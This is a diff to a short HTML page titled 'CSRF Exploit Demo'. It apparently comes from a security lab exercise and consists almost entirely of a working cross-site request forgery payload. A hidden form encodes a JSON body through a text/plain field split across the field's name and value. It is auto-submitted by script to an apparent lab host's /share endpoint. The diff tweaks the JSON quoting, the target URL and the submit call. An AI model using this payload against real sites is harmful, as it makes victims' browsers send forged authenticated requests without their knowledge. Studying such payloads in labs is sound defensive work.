@@ -7,11 +7,12 @@
   <h1>CSRF Exploit Demo</h1>
   <p>This page demonstrates a Cross-Site Request Forgery attack.</p>
 
-  <form id="csrf" action="https://ptl-c14f5df8-12d471f9.libcurl.so/share" method="POST" enctype="text/plain">
-    <input type="hidden" name='{"user":"test","id":"0"' value='}'>
+  <form id="csrf" action="http://ptl-9047034f-884bc5c5.libcurl.so/share" method="POST" enctype="text/plain">
+    <input type="hidden" name='{"user":"demo1","id":"0' value='"}'>
   </form>
-<script>
-document.forms[0].submit();
-</script>
+
+  <script>
+    document.getElementById('csrf').submit();
+  </script>
 </body>
 </html>
